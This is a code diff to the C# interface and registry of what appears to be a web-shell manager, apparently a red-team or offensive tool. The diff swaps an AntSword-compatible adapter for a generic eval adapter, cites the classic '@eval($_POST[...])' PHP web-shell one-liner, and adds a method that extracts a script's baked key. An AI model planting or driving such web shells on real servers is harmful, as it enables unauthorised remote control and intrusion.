@@ -30,11 +30,12 @@ public sealed record WebShellRequest(
 /// without the core learning anything about it (architecture.md Sec 13).
 ///
 /// The in-tree families are the Rod-native one (a one-line script whose
-/// 256-bit baked key seals the channel as AES-256-GCM) and the
-/// AntSword-compatible eval family (MIT, kept as interop for scripts
-/// placed for other managers); adapters for closed-source tools'
-/// protocols arrive out-of-tree through the tradecraft layer's
-/// registration path.
+/// 256-bit baked key seals the channel as AES-256-GCM) and the universal
+/// one-liner family (the classic <c>@eval($_POST[...])</c> shape every
+/// manager drives -- a script placed by hand or by another tool answers
+/// it because the one-liner itself is universal); adapters for
+/// closed-source tools' protocols arrive out-of-tree through the
+/// tradecraft layer's registration path.
 /// </summary>
 public interface IWebShellProtocolAdapter
 {
@@ -71,6 +72,14 @@ public interface IWebShellProtocolAdapter
     /// refusal messages ("the base64 of a 256-bit key", "a short token").
     /// </summary>
     string CredentialHint { get; }
+
+    /// <summary>
+    /// The credential baked into a rendered script, read back out of the
+    /// script text -- the payload library's way of showing a generated
+    /// script's connection key without storing it anywhere else. Null when
+    /// the text is not this family's rendered shape.
+    /// </summary>
+    string? ReadCredentialFromScript(string script);
 
     /// <summary>
     /// Renders the script an operator places in the target's web root --
@@ -112,7 +121,7 @@ public static class WebShellAdapters
     static WebShellAdapters()
     {
         Register(new RodPhpAdapter());
-        Register(new AntSwordPhpAdapter());
+        Register(new EvalPhpAdapter());
     }
 
     /// <summary>Registers an adapter under its id; a duplicate id is refused.</summary>
